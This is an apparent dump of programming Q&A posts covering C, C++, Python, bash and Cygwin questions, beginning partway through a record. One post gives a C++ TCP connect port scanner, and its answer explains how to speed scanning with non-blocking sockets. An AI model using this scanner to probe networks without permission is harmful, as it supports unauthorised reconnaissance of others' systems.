<li>You have a <code>@implementation XYZFlipsideViewController ... @end</code> block in both of the source files <code>XYZAppDelegate.m</code> and <code>XYZFlipsideViewController.m</code>, <em>or</em></li>
<li>You have the <code>@implementation ... @end</code> block inside a header file which is <code>#include</code>/<code>#import</code>ed by both of those source files</li>
</ul>

<p>In the first case, the solution is to remove one of the <code>@implementation</code> blocks.  In the second case, the solution is to <strong>move the <code>@implementation</code> block from the header into the source file</strong>, but keep the <code>@interface</code> block in the header file.</p>

<p>It's important to understand the distinction between <code>@interface</code> and <code>@implementation</code> -- the former says ""Here is the name of a class, the names of its instance variables, and the names of its member functions"", whereas the latter says ""Here are all the definitions of the class's properties and member functions"".</p>
"
"<p>So I made a port scanner in C++ this morning and it seems to work alright, just having one rather annoying issue with it- whenever I use it to scan an IP over the network, it takes a good 10-20 seconds PER port.</p>

<p>It seems like the connect() method is what's taking it so long.</p>

<p>Now aside from multi-threading, which I'm sure will speed up the process but not by much, how could I make this faster? Here is the section of code that does the scanning:</p>

<pre><code>for (i = 0; i &lt; a_size(port_no); i++)
{
    sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);

    target.sin_family = AF_INET;
    target.sin_port = htons(port_no[i]);
    target.sin_addr.s_addr = inet_addr(argv[1]);

    if (connect(sock, (SOCKADDR *)&amp;target, sizeof(target)) != SOCKET_ERROR)
        cout &lt;&lt; ""Port: "" &lt;&lt; port_no[i] &lt;&lt; "" - open"" &lt;&lt; endl;
    else
        cout &lt;&lt; ""Port: "" &lt;&lt; port_no[i] &lt;&lt; "" - closed"" &lt;&lt; endl;
    closesocket(sock);
}
</code></pre>

<p>If you need more let me know.</p>

<p>Oh also, I am using the winsock2.h file. Is it because of this that its so slow?</p>
","9530","","<p>When you call <code>connect(2)</code>, the OS initiates the <a href=""http://en.wikipedia.org/wiki/Transmission_Control_Protocol#Connection_establishment"" rel=""nofollow"">three-way handshake</a> by sending a <code>SYN</code> packet to the other peer.  If no response is received, it waits a little bit and sends a few more <code>SYN</code> packets.  If no response is still received after a given timeout, then the operation fails, and <code>connect(2)</code> returns with the error code <code>ETIMEODOUT</code>.</p>

<p>Ordinarily, if a peer is up but not accepting TCP connections on a given port, it will reply to any <code>SYN</code> packets with a <code>RST</code> packet.  This will cause <code>connect(2)</code> to fail much more quickly (one network round-trip time) with the error <code>ECONNREFUSED</code>.  However, if the peer has a firewall set up, it'll just ignore your <code>SYN</code> packets and won't send those <code>RST</code> packets, which will cause <code>connect(2)</code> to take a long time to fail.</p>

<p>So, if you want to avoid waiting for that timeout for every port, you need to do multiple connections in parallel.  You can do this multithreading (one synchronous <code>connect(2)</code> call per thread), but this doesn't scale well since threads take up a fair amount of resources.</p>

<p>The better method would be to use non-blocking sockets.  To make a socket non-blocking, call <a href=""http://linux.die.net/man/2/fcntl"" rel=""nofollow""><code>fcntl(2)</code></a> with the <code>F_SETFL</code> option and the <code>O_NONBLOCK</code> option.  Then, <code>connect(2)</code> will return immediately with either <code>EWOULDBLOCK</code> or <code>EAGAIN</code>, at which point you can use either <a href=""http://linux.die.net/man/2/select"" rel=""nofollow""><code>select(2)</code></a> or <a href=""http://linux.die.net/man/2/poll"" rel=""nofollow""><code>poll(2)</code></a> and friends to monitor a large number of sockets at once.</p>
"
"<p>I'm designing a program that has a function that finds words from the input and then sends them to a different function to compare to a dictionary (array of <code>const char*</code> ""strings"").</p>

<p>I wanted to use <code>strncmp()</code> from <code>&lt;string.h&gt;</code> and, naturally, <code>strncmp()</code> expects both arguments to be <code>const char*</code>. Since I am parsing my input a char at a time, I am putting the words into an array.</p>

<p>How do I transpose an array of chars into a <code>const char*</code> ""string""? I hate to admit it, but I really don't know how to do it. Searched around and couldn't find the answer. </p>

<p>The best  I have come up with is to use <code>memcpy()</code>... not sure if there are better ways?</p>

<p><strong>TL;DR</strong> What are good ways to make an array of chars into a <code>const char*</code> ""string""?</p>

<p><em>For example</em></p>

<pre><code>char someArray[5] = ""word""; /* assume generated char by char, null terminated */
const char* new_format = foo(someArray);
</code></pre>
","9530","","<p>As long as your array has a null terminator (a 0 byte) at the end, it can be used anywhere you need a pointer, since arrays decay into pointers to their first elements:</p>

<pre><code>char someArray[5] = ""word"";
char *pointer = someArray;  // That's it!
strncmp(pointer, ""something else"", 5);

// Or, more simply:
char someArray[5] = ""word"";
strncmp(someArray, ""something else"", 5);
</code></pre>
"
"<p>I think my code wouldn't print the text </p>

<blockquote>
  <p>oh why come here!\n</p>
</blockquote>

<p>but it does.</p>

<p>Is there something 'wrong' with <code>system()</code>? Because, when I removed it, the code ran as I wanted, halting up.</p>

<pre><code>#include &lt;pthread.h&gt;
#include &lt;semaphore.h&gt;
#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;

pthread_t id0, id1;
sem_t sp; 

void *fun0(void *) {
    // When erasing the following line ""system("""");"",
    // it block up, and doesn't print ""oh why come here!\n"".
    // But with it, it print the text!
    system("""");
    return NULL;
}

void *fun1(void *) {
    sem_wait(&amp;sp);
    fprintf(stderr, ""oh why come here!\n"");
    return NULL;
}
int main() {
    sem_init(&amp;sp, 0, 0); 
    pthread_create(&amp;id0, 0, fun0, NULL);
    pthread_create(&amp;id1, 0, fun1, NULL);
    void *stat0, *stat1;
    pthread_join(id0, &amp;stat0);
    pthread_join(id1, &amp;stat1);
    return 0;
}
</code></pre>

<p>Compiler: gcc 4.1.2
Linux kernel: 2.6.18</p>

<hr>

<p>I compiled it with gcc 4.6.3, kernel 3.2.0, it ran as I want also.
So I think it is because of gcc 4.1.2 or kernel 2.6.18.</p>
","9530","","<p>The <code>system()</code> call has nothing to do with it.  My psychic powers tell me that <code>sem_wait</code> is failing with an error code instead of waiting—check the return value.  For example, I can reproduce your results on Mac OS X, because on Mac OS X, <code>sem_init()</code> always fails with <code>ENOSYS</code> (""Function not implemented""), which causes the call to <code>sem_wait</code> to then fail with <code>EBADF</code> (""Bad file descriptor"").</p>

<p>If you add some error checking, you'll see where things go awry:</p>

<pre><code>if(sem_init(&amp;sp, 0, 0) &lt; 0)
    fprintf(stderr, ""sem_init failed: %s\n"", strerror(errno));
...
if(sem_wait(&amp;sp) &lt; 0)
    fprintf(stderr, ""sem_wait failed: %s\n"", strerror(errno));
</code></pre>

<p>You should also crank up the warning level on your compiler—I definitely recommend using <code>-Wall</code>, and <code>-Wextra -pedantic</code> if you want to catch a lot more possible problems.  Currently, your code invokes <em>undefined behavior</em> by failing to return values from your <code>fun0</code> and <code>fun1</code> functions, which <code>-Wall</code> would warn you about.  This kind of error may not cause any obvious problems on x86, but on other architectures such as IA64, <a href=""http://blogs.msdn.com/b/oldnewthing/archive/2004/01/19/60162.aspx"" rel=""nofollow"">uninitialized garbage can be deadly</a>.</p>
"
"<p>I am unable to figure out why this is happening.</p>

<pre><code>$ cat | g++ -xc -
#include &lt;iostream&gt;

int main(int argc, char* argv[]) {
  return 0;
}
&lt;stdin&gt;:1: fatal error: iostream: No such file or directory
compilation terminated.

$ g++ --v
Using built-in specs.
Target: i686-linux-gnu
Configured with: ../src/configure -v --with-pkgversion='Ubuntu/Linaro 4.4.7-2ubuntu1'
--with-bugurl=file:///usr/share/doc/gcc-4.4/README.Bugs --enable-languages=c,c++,fortran
--prefix=/usr --program-suffix=-4.4 --enable-shared --enable-linker-build-id
--with-system-zlib --libexecdir=/usr/lib --without-included-gettext
--enable-threads=posix --with-gxx-include-dir=/usr/include/c++/4.4 --libdir=/usr/lib
--enable-nls --with-sysroot=/ --enable-clocale=gnu --enable-libstdcxx-debug
--enable-targets=all --disable-werror --with-arch-32=i686 --with-tune=generic 
--enable-checking=release --build=i686-linux-gnu --host=i686-linux-gnu 
--target=i686-linux-gnu
Thread model: posix
gcc version 4.4.7 (Ubuntu/Linaro 4.4.7-2ubuntu1)
</code></pre>

<p>A similar C program works with gcc. What am I missing?</p>

<p>Thanks,
Nilesh.</p>
","9530","","<p>C is not C++.  The header <code>&lt;iostream&gt;</code> is a C++ header.  If you want to compile C++, then you need to use the <code>-xc++</code> option, not <code>-xc</code>.</p>
"
"<p>I did a very simple program in C for linux a few months ago to read data from a socket and write it to disk. Now I want to run it on Windows, so I installed cygwin and everything worked fine.</p>

<p>The problem appears in windows when my program is writing the data to a file and, at the same time, I try to open that file with another tool. It complains and doesn't open the file because it is opened by other process.</p>

<p>After googleing, I have read that to avoid that, in windows, you have to create the file with SHARE_FILE_READ and SHARE_FILE_WRITE flags, but the problem is that my program is written in C for linux and I just use a standard open syscall..</p>

<p>Is there any way to tell cygwin to add that shared modes to the file that my program is opening?</p>
","9530","","<p>The issue is that <em>both</em> processes which open the file must do so with compatible sharing modes in order to succeed.  Cygwin is opening the file with the correct sharing mode, but the other program is not.</p>

<p>For all files which are not special device files for tape drives, Cygwin opens them by calling <code>NtCreateFile</code> with a sharing mode of <code>FILE_SHARE_VALID_FLAGS</code> (equivalent to <code>FILE_SHARE_READ|FILE_SHARE_WRITE|FILE_SHARE_DELETE</code>)—see the implementation of  <code>fhandler_base::open()</code> in <a href=""http://cygwin.com/cgi-bin/cvsweb.cgi/src/winsup/cygwin/fhandler.cc?rev=1.433&amp;content-type=text/x-cvsweb-markup&amp;cvsroot=src"" rel=""nofollow""><code>fhandler.cc</code></a>, which is what <code>fopen()</code>, <code>open()</code> etc. all use under the hood.</p>

<p>You need to convince your other program to open the file with the correct sharing mode; if it uses a sharing mode of 0 (no sharing), then it doesn't matter how Cygwin opens the file—the program will always get a sharing violation in that case.</p>
"
"<p>I have a struct from a source file s.cpp:</p>

<pre><code>struct s{
unsigned long long a;
s(unsigned long long b){a=b;}
unsigned long long get(){return a;}
};
</code></pre>

<p>And in main file, compiled of course with g++ main.cpp s.cpp brief syntax</p>

<pre><code>struct s{
s(unsigned long long b);
unsigned long long get();
};

s s1(123456);
//some code
unsigned long long c=s1.get();
</code></pre>

<p>Now I know it will not compile returning undefined reference, wich is a shame. Have to define ctor and get(), outside of brackets in s.cpp. I wonder if there's a g++ flag to possibly not having to.
But the main question is, is the s1.get() safe or is undefined behaviour?</p>

<p><strong>EDIT</strong></p>

<p>Thanks for your responses, but I still don't understand well the mechanism.
So in this case in s.cpp:</p>

<pre><code>struct teste{
    int a=0;
    teste(int b);
    int g();
};
teste::teste(int b){a+=b;}
int teste::g(){ return a;}
</code></pre>

<p>and in main:</p>

<pre><code>struct teste{
    int c=1;
    teste(int b);
    int g();
};

teste ato(8);
printf(""\n%d"",ato.g());
</code></pre>

<p>Considering the memory allocation, shouldn't return 9 instead of 8 as it actual perform?
Even if I change c to a, making it exactly equal but the 1, it seems to look always for the a and its init value from s.cpp always.
Sugesting that declaration of other thing than method to main is superflous.</p>
","9530","","<p>No, it's not safe -- if you can manage to get it to compile, it's undefined behavior.  It directly violates the <strong>One Definition Rule</strong>, in particular C++03 §3.2/5, which says:</p>

<blockquote>
  <p>There can be more than one definition of a class type (clause 9), [...] , in a program provided that each
  definition appears in a different translation unit, and provided the definitions satisfy the following requirements.
  Given such an entity named <code>D</code> defined in more than one translation unit, then<br>
  — each definition of <code>D</code> shall consist of the same sequence of tokens; and<br>
  <em>... More conditions omitted ...</em></p>
  
  <p>[...] If the
  definitions of <code>D</code> satisfy all these requirements, then the program shall behave as if there were a single
  definition of <code>D</code>. If the definitions of D do not satisfy these requirements, then the behavior is undefined.</p>
</blockquote>

<p>Since your two class definitions do <em>not</em> consist of the same sequence of tokens, the behavior is undefined.</p>

<p>The C++11 behavior is identical here.</p>
"
"<p>I'm trying to open the latest Japanese Wikipedia database for reading in Python 3.3.1 on Linux, but am getting a <code>Segmentation fault (core dumped)</code> error with this short program:</p>

<pre><code>with open(""jawiki-latest-pages-articles.xml"") as f:
    text = f.read()
</code></pre>

<p>The file itself is quite large:</p>

<pre><code>-rw-r--r-- 1 fredrick users 7368183805 May 17 20:19 jawiki-latest-pages-articles.xml
</code></pre>

<p>So it seems like there is an upper limit to just how long a string I can store. What's the best way to tackle this situation?</p>

<p>My end goal is to count the most common characters in the file, sort of like a modern version of Jack Halpern's ""Most Commonly Used Kanji in Newspapers"". :)</p>
","9530","","<p>Don't read the whole article at once.  Even if your Python distribution is compiled as a 64-bit program (it's simply impossible to allocate more than 4 GB of virtual memory in a 32-bit program), and even if you have enough RAM to store it all, it's still a bad idea to read it all into memory at once.</p>

<p>One simple option is to read it a line at a time and process each line:</p>

<pre><code>with open(""jawiki-latest-pages-articles.xml"") as f:
    for line in f:
        # Process one line
</code></pre>

<p>Alternatively, you can process it in fixed-size chunks:</p>

<pre><code>while True:
    data = f.read(65536)  # Or any other reasonable-sized chunk
    if not data:
        break
    # Process one chunk of data.  Make sure to handle data which overlaps
    # between chunks properly, and make sure to handle EOF properly
</code></pre>
"
"<p>I am trying to automate some plotting using python and fortran together. 
I am very close to getting it to work, but I'm having problems getting the result from a glob search to feed into my python function.</p>

<p>I have a .py script that says</p>

<pre><code>    import glob
    run=glob.glob('JUN*.aijE*.nc')

    from plot_check import plot_check
    plot_check(run)
</code></pre>

<p>But I am getting this error</p>

<pre><code>    plot_check(run)
    Traceback (most recent call last):
    File ""&lt;stdin&gt;"", line 1, in &lt;module&gt;
    File ""plot_check.py"", line 7, in plot_check
     ncfile=Dataset(run,'r') 
    File ""netCDF4.pyx"", line 1328, in netCDF4.Dataset.__init__ (netCDF4.c:6336)
    RuntimeError: No such file or directory
</code></pre>

<p>I checked that the glob is doing its job and it is, but I think it's the format of my variable ""run"" that's screwing me up.</p>

<p>In python:</p>

<pre><code>    &gt;&gt;run
    &gt;&gt;['JUN3103.aijE01Ccek0kA.nc']
    &gt;&gt;type(run)
    &lt;type 'list'&gt;
</code></pre>

<p>So my glob is finding the file name of the file I want to put into my function, but something isn't quite working when I try to input the variable ""run"" in to my function ""plot_check"".</p>

<p>I think it might be something to do with the format of my variable ""run"", but I'm not quite sure how to fix it. </p>

<p>Any help would be greatly appreciated!</p>
","9530","","<p><code>glob.glob</code> returns a list of all matching filenames.  If you know there's always going to be exactly one file, you can just grab the first element:</p>

<pre><code>filenames = glob.glob('JUN*.aijE*.nc')
plot_check(filenames[0])
</code></pre>

<p>Or, if it might match more than one file, then iterate over the results:</p>

<pre><code>filenames = glob.glob('JUN*.aijE*.nc')
for filename in filenames:
    plot_check(filename)
</code></pre>
"
"<p>I have a front-end X program, in this program , a background program a.out is called. In a.out, there are some <code>printf</code> sentences. I found the standard outputs are saved in <code>~/.xsession-errors</code>. Is it normal? I don't want to save these printf contents. Is there any method to avoid saving them except deleting <code>printf</code>?</p>
","9530","","<p>Yes, you can use the <a href=""http://linux.die.net/man/3/freopen"" rel=""nofollow""><code>freopen(3)</code></a> function to redirect <code>stdout</code> to some other file, or to the null device if you'd rather not have any output:</p>

<pre><code>// Discard all further output to standard output for the duration of the
// program (or until the next call to freopen()):
stdout = freopen(""/dev/null"", ""w"", stdout);
</code></pre>

<p>Depending on how the child program is launched, you can also just redirect its stdout stream.  If you're launching it with <code>system(3)</code>, you can just use shell redirection:</p>

<pre><code>system(""./a.out args &gt;/dev/null"");
</code></pre>

<p>If you're launching it with a <code>fork()</code> and <code>exec()</code> pair, then you can redirect the stdout file descriptor in between the <code>fork()</code> and <code>exec()</code> to avoid changing anything in the parent process:</p>

<pre><code>// Error checking omitted for expository purposes
pid_t pid = fork();
if(pid == 0)
{
    // Child process
    int fd = open(""/dev/null"", O_WRONLY);
    dup2(fd, STDOUT_FILENO);
    close(fd);
    execve(""./a.out"", argv, envp);
}
</code></pre>
"
"<p>Why does the type used to derefernce pointers passed to printf affect the output, even if the types are the same size:</p>

<pre><code>void test_double(void *x)
{
    double *y = x;
    uint64_t *z = x;
    printf(""double/double: %lf\n"", *y);
    printf(""double/uint64: %lf\n"", *z);
    printf(""uint64/double: 0x%016llx\n"", *y);
    printf(""uint64/uint64: 0x%016llx\n"", *z);
}

int main(int argc, char** argv)
{    
    double x = 1.0;
    test_double(&amp;x);
    return 0;
}
</code></pre>

<p>Output:</p>

<pre><code>double/double: 1.000000
double/uint64: 1.000000
uint64/double: 0x00007f00e17d7000
uint64/uint64: 0x3ff0000000000000
</code></pre>

<p>I would have expected the last two lines to both correctly print 0x3ff0000000000000, the representation of 1.0 in an IEEE754 double floating point. </p>
","9530","","<p>It's Undefined Behavior.  The C language standard says that if the variadic arguments don't have the type implied by the format string, then that's UB.  In your third print statement, you're passing a <code>double</code>, but it's expecting a <code>uint64_t</code>.  Since it's UB, anything can happen.</p>

<p>This specification allows the implementation to do things like pass integers on the stack but floating-point values through the FPU registers, which is what I suspect is happening in your test case.  For example, the <a href=""http://en.wikipedia.org/wiki/X86_calling_conventions#cdecl"" rel=""nofollow"">cdecl calling convention</a> on Linux on x86 (GCC) passes floating-point function arguments on the x87 pseudo-stack (registers <code>ST0...ST7</code>).</p>

<p>If you look at the generated assembly, you'll probably discover why your third and fourth print statements are behaving differently.  On Mac OS X 10.8.2 64-bit with Clang 4.1, I was able to reproduce similar results, and the assembly looked like this, which I've annotated:</p>

<pre><code>        .section        __TEXT,__text,regular,pure_instructions
        .globl  _test_double
        .align  4, 0x90
_test_double:                           ## @test_double
        .cfi_startproc
## BB#0:
        pushq   %rbp
Ltmp3:
        .cfi_def_cfa_offset 16
Ltmp4:
        .cfi_offset %rbp, -16
        movq    %rsp, %rbp
Ltmp5:
        .cfi_def_cfa_register %rbp
        pushq   %rbx
        pushq   %rax
Ltmp6:
        .cfi_offset %rbx, -24

    # printf(""%lf"", double)
        movq    %rdi, %rbx
        movsd   (%rbx), %xmm0
        leaq    L_.str(%rip), %rdi
        movb    $1, %al
        callq   _printf

    # printf(""%lf"", uint64_t)
        movq    (%rbx), %rsi
        leaq    L_.str1(%rip), %rdi
        xorb    %al, %al
        callq   _printf

    # printf(""%llx"", double)
        leaq    L_.str2(%rip), %rdi
        movsd   (%rbx), %xmm0
        movb    $1, %al
        callq   _printf

    # printf(""%llx"", uint64_t)
        leaq    L_.str3(%rip), %rdi
        movq    (%rbx), %rsi
        xorb    %al, %al
        addq    $8, %rsp
        popq    %rbx
        popq    %rbp
        jmp     _printf                 ## TAILCALL
        .cfi_endproc
</code></pre>

<p>In the case of printing a <code>double</code> value, it's putting the argument into the <a href=""http://en.wikipedia.org/wiki/Streaming_SIMD_Extensions"" rel=""nofollow"">SIMD <code>%xmm0</code> register</a>:</p>

<pre><code>movsd   (%rbx), %xmm0
</code></pre>

<p>But in the case of a <code>uint64_t</code> value, it's passing the argument through the integer register <code>%rsi</code>:</p>

<pre><code>movq    (%rbx), %rsi
</code></pre>
"
"<p>I just started learning about anonymous pipe communication. My question is what is the difference between AnonymousPipeStream and CreatePipe method.</p>

<p>Right now I am creating pipe with CreatePipe() and read/write data with ReadFile()/WriteFile() functions and it works fine. </p>

<p>But I see there are a lot of examples in the internet that create pipes completely in a different way using streams. </p>

<p>what is the advantage of each method? or they are not different methods and my understanding is wrong? </p>

<p>references:</p>

<p><a href=""http://msdn.microsoft.com/en-CA/library/system.io.pipes.aspx"" rel=""nofollow"">http://msdn.microsoft.com/en-CA/library/system.io.pipes.aspx</a></p>

<p><a href=""http://msdn.microsoft.com/en-us/library/windows/desktop/ms682499(v=vs.85).aspx"" rel=""nofollow"">http://msdn.microsoft.com/en-us/library/windows/desktop/ms682499(v=vs.85).aspx</a></p>
","9530","","<p><code>AnonymousPipeClientStream</code> and <code>AnonymousPipeServerStream</code> are C# classes.  <code>CreatePipe</code> is the raw native API.  If you're coding in pure native C or C++, you cannot call into C# code (at least not without a fair amount of non-trivial work).</p>
"
"<p>I'm calling <code>subprocess.popen()</code> on the <a href=""http://www.foolabs.com/xpdf/"" rel=""nofollow"">xpdf</a> program pdfinfo, which is returning text including some characters in the upper half of the 8-bit character set.</p>

<p>I pass the result to a JSON serializer and it is complaining when it gets to character <code>\xae</code> (the &reg; sign):</p>

<pre><code>&gt;&gt;&gt; import json
&gt;&gt;&gt; json.dumps({'a':'Adobe\xae'})
Traceback (most recent call last):
  File ""&lt;stdin&gt;"", line 1, in &lt;module&gt;
  File ""c:\app\python\2.7.3\lib\json\__init__.py"", line 231, in dumps
    return _default_encoder.encode(obj)
  File ""c:\app\python\2.7.3\lib\json\encoder.py"", line 201, in encode
    chunks = self.iterencode(o, _one_shot=True)
  File ""c:\app\python\2.7.3\lib\json\encoder.py"", line 264, in iterencode
    return _iterencode(o, 0)
UnicodeDecodeError: 'utf8' codec can't decode byte 0xae in position 5: invalid start byte
</code></pre>

<p>How can I fix this? I am totally confused about codecs and where I'm supposed to add the right information to help Python figure out how to deal with it.</p>

<hr>

<p>Edit: If the input is from <em>me</em> (or at least my source code), not another process, I could just use a Unicode string literal</p>

<pre><code>&gt;&gt;&gt; json.dumps({'a':u'Adobe\u00ae'})
'{""a"": ""Adobe\\u00ae""}'
</code></pre>

<p>and Python would handle it fine.</p>

<p>But I don't know what hint to give Python to decode the output of pdfinfo as Unicode.</p>
","9530","","<p>First, you need to figure out what the character encoding of the data you're getting back is.  I'm guessing that it's <a href=""http://en.wikipedia.org/wiki/Windows-1252"" rel=""nofollow"">Windows-1252</a>, which has the symbol ""®"" at code point 0xAE.  So, to decode that, you would use the <a href=""http://docs.python.org/2/library/stdtypes.html#str.decode"" rel=""nofollow""><code>str.decode</code></a> function:</p>

<pre><code>raw_data = 'Adobe\xae'
decoded = raw_data.decode('Windows-1252')
print decoded  # Prints ""Adobe®""
</code></pre>
"
"<p>I need to make an interactive bash script where the user will input a word, for example 'xyz' and it will replace a word in a text file.</p>

<p>For example, I have a script called example.sh. When i run it, it should ask:</p>

<pre><code>What is your name?: 
and the user will input 'xyz'.
</code></pre>

<p>The script should take that input and replace 'username' inside a text file called userlist.txt to 'xyz'</p>

<p>to be more clear, I need user input to run </p>

<p><code>sed -i -e s/username/userinput/g userlist.txt</code></p>
","9530","","<p>You can use the <a href=""http://www.gnu.org/software/bash/manual/bashref.html#index-read"" rel=""nofollow""><code>read</code> builtin</a> to read user input, and you can then use <a href=""http://linux.die.net/man/1/sed"" rel=""nofollow""><code>sed(1)</code></a> to do the text replacement:</p>

<pre><code>if read -p ""What is your name? "" name; then
  sed -i~ -e ""s/username/${name}/g"" userlist.txt
else
  # Error
fi
</code></pre>
"
"<p>I am trying to write <code>#define</code> for <code>ASSERT()</code> using <code>__VA_ARGS</code>.<br>
(This code is for an embedded processor which doesn't support all libc functions).</p>

<p>My source code is like this:</p>

<pre><code>ASSERT(msg == NULL)
</code></pre>

<p><code>ASSERT</code> in header file:</p>

<pre><code>#define ASSERT(...) if(__VA_ARGS__) { printf(""[ASSERT ERROR]"" __VA_ARGS__ ""\n""); }
</code></pre>

<p>The preprocessor output is like this, which results compilation error.</p>

<pre><code>if(msg == NULL) { printf(""[ASSERT ERROR]"" msg == NULL ""\n""); }
</code></pre>

<p>How do I fix the <code>#define</code> to get rid of compilation errors while keeping the code logically correct?</p>
","9530","","<p>There's no reason for this to be a variadic macro, at least not with telling us more information about what exactly you're trying to do.  A simple one-argument macro using the stringizing operator <code>#</code> will do the trick nicely:</p>

<pre><code>#define ASSERT(x) if(x); else printf(""[ASSERT ERROR] "" #x ""\n"")
</code></pre>

<p>Also note that I omitted the semicolon at the end and wrote it as <code>if(x); else</code> instead of <code>if(!(x))</code>, so that all of the following code fragments compile correctly as you'd expect, or produce a compiler error as you'd expect:</p>

<pre><code>// #1 - this must be an error, no semicolon
ASSERT(x)

// #2 - this must also be an error
ASSERT(x)
else
    /*stuff*/ ;

// #3 - the else must go with the first if, not the inner if inside the macro
// expansion
if (x)
    ASSERT(y);
else
    /*stuff*/ ;
</code></pre>

<p>Your original macro definition fails test #3 above.</p>
"
"<p>I have a list container class (not the <code>std::list</code>) that can store any
type. I want to store many <code>std::listS</code> in this container with
different types(<code>list&lt;int&gt;</code>, <code>list&lt;string&gt;</code> etc.). </p>

<p>Can I use a generic binary predicate when I am sorting them?</p>

<p>Pseudo code:</p>

<pre><code>template &lt;typename T&gt;
bool compare(const T&amp; input1, const T&amp; input2)
{
    return input1&gt;input2;
}

for(auto i = myList.begin(); i!=myList.end(); ++i) //i is an iterator to a std::list
{
    (*i).sort(compare&lt;decltype(*i)::value_type&gt;);
    //when dereferencing i I get a
    //std::list
}
</code></pre>

<p>Is this valid (I am not really sure if I can use decltype this way)?</p>

<p>The problem is I can't get even this simple example to compile:</p>

<pre><code>#include &lt;iostream&gt;
#include &lt;list&gt;
using namespace std;

template &lt;typename T&gt;
void display(const T&amp; input)
{
    for(auto i = input.cbegin(); i!=input.cend(); ++i)
        cout &lt;&lt; *i &lt;&lt; ' ';
    cout &lt;&lt; endl;
    return;
}

template &lt;typename R&gt;
class SomeFunc
{
public:
    bool operator ()(const R&amp; in1, const R&amp; in2)
    {
        return in1&gt;in2;
    }
};

template &lt;typename R&gt;
bool someFunc(const R&amp; in1, const R&amp; in2)
{
    return in1&lt;in2;
}


int main()
{
    list&lt;int&gt; myList;
    myList.push_back(5);
    myList.push_back(137);
    myList.push_back(-77);
    display(myList);
    myList.sort(SomeFunc&lt;decltype(myList)::value_type&gt;());
    display(myList);
    myList.sort(someFunc&lt;decltype(myList)::value_type&gt;);
    display(myList);

    cin.ignore();
    return 0;

};
</code></pre>

<p><strong>Correction:</strong>
It does compile here: <a href=""http://ideone.com/ZMcjSJ"" rel=""nofollow"">http://ideone.com/ZMcjSJ</a>
Not on my VS2012 though... I'm starting to hate VS. Can anybody clarify a possible reason why it wouldn't compile on VS2012? I obviously have the decltype command in VS2012 but I suppose it doesn't work like a C++ 11 dectype would work?
<a href=""http://msdn.microsoft.com/en-us/library/vstudio/hh567368.aspx"" rel=""nofollow"">http://msdn.microsoft.com/en-us/library/vstudio/hh567368.aspx</a></p>

<p>I tried it in CodeBlocks with gnu gcc set to C++ 11 - works fine.</p>
","9530","","<p>Yes, the method <a href=""http://www.cplusplus.com/reference/list/list/sort/"" rel=""nofollow""><code>std::list&lt;T&gt;::sort()</code></a> has an overload which takes a comparison functor:</p>

<pre><code>template &lt;typename T&gt;
struct MyComparator
{
    bool operator() const (const T&amp; input1, const T&amp; input2)
    {
        return input1 &gt; input2;
    }
};
...
myList.sort(MyComparator&lt;T&gt;());
</code></pre>
"
"<p>I have a function that accepts function pointer as an argument and calls the function pointer as shown below. </p>

<pre><code>int foo (int a, int(*calc)(int))
{
    int y;
    // ....
    // calling calc function via callback
    (*calc)(y);
}
</code></pre>

<p>The calc function to be called back looks like </p>

<pre><code>int calc(int x)
{
    // ....
    cout &lt;&lt; x; 
    checkValue(x);
}
</code></pre>

<p>function <code>foo</code> is placed in <code>a.cpp</code> and function <code>calc()</code> and <code>checkValue()</code> are defined in files <code>b.cpp</code> and <code>c.cpp</code>.  My problem is  <code>calc()</code> executes fine until the <code>cout</code> statement and fails to call <code>checkValue()</code> function. The crash report I received is:</p>

<pre><code>symbol lookup error:..... undefined symbol: _ZNSaIcEC1Ev, version GLIBCXX_3.4
</code></pre>

<p>How can I solve this problem?</p>
","9530","","<p>The symbol <code>_ZNSaIcEC1Ev</code> is the mangled name for the <code>std::allocator&lt;char&gt;::allocator()</code> zero-argument constructor (I determined this using the <a href=""http://linux.die.net/man/1/c++filt"" rel=""nofollow""><code>c++filt(1)</code></a> program).  The error message ""<code>symbol lookup error:..... undefined symbol</code>"" relates to dynamic linking and has nothing to do with calling a function through a function pointer.</p>

<p>Your error almost certainly lies somewhere else.  You're probably getting confused about the location of the error due to <strong>stdout buffering</strong> -- strings are getting printed to stdout, but you're not seeing them show up because they're getting buffered in memory, and then the program crashes before they're displayed.  To avoid that, you need to make sure to flush the output after every print statement (e.g. by inserting <code>std::cout &lt;&lt; std::endl</code> or <code>std::cout &lt;&lt; std::flush</code> or explicitly calling <code>std::cout.flush()</code>), or by using <code>std::cerr</code> instead of <code>std::cout</code>, which is unbuffered by default.</p>
"
"<p>Im trying to code a C function that has a optional argument, and if that argument isn't ""used"", then it has a default value.</p>

<pre><code>int DumpData(int a, int b, int c=0)
{

if(c != 0)
{
          //stuff
}
    //banana
}

/* Function Call */

DumpData(1, 2);
</code></pre>

<p>Is there any way to solve this issue ?</p>
","9530","","<p>No, there's no way to do this in C.  The best you can do is to have separate functions:</p>

<pre><code>int DumpData(int a, int b)
{
    return DumpDataABC(a, b, 0);
}

int DumpDataABC(int a, int b, int c)
{
    ...
}
</code></pre>

<p>Or, use C++ instead of C.</p>
"
"<p>I have some problem with including <code>thread</code> module, when I add:</p>

<pre><code>#include &lt;thread&gt;
</code></pre>

<p>the call to the bind function gives me error:</p>

<blockquote>
  <p>Error 3   error C2440: '=' : cannot convert from 'std::_Bind&lt;_Forced,_Ret,_Fun,_V0_t,_V1_t,_V2_t,_V3_t,_V4_t,_V5_t,>' to 'int'    c:\users\ohadpeled\documents\visual studio 2012\projects\loginserver\loginserver\server.cpp 87  1   LoginServer
      4   IntelliSense: no suitable conversion function from ""std::_Bind"" to ""int"" exists c:\Users\OhadPeled\Documents\Visual Studio 2012\Projects\LoginServer\LoginServer\Server.cpp 87  20  LoginServer</p>
</blockquote>

<p>I don't understand why it cause this error, without including the thread module the call works fine. I'd be happy if someone will explain me what cause it.</p>

<p>Here is part of the server class:</p>

<pre><code>            /* Set TCP listening socket */
            ListenResult = bind(ListenSocket, result-&gt;ai_addr, (int)result-&gt;ai_addrlen); // Error in this line
            if (ListenResult != SOCKET_ERROR) 
            {
                freeaddrinfo(result);

                ListenResult = listen(ListenSocket, SOMAXCONN);
                if (ListenResult != SOCKET_ERROR) 
                {
                    /* Accepting clients */
                    while(true)
                    {
                        ClientSocket = new SOCKET();
                        ADDR = new SOCKADDR_IN();
                        ADDRSize = sizeof(*ADDR);
                        *ClientSocket = accept(ListenSocket, (struct sockaddr*)ADDR, &amp;ADDRSize);
                        if (*ClientSocket != INVALID_SOCKET) 
                        {
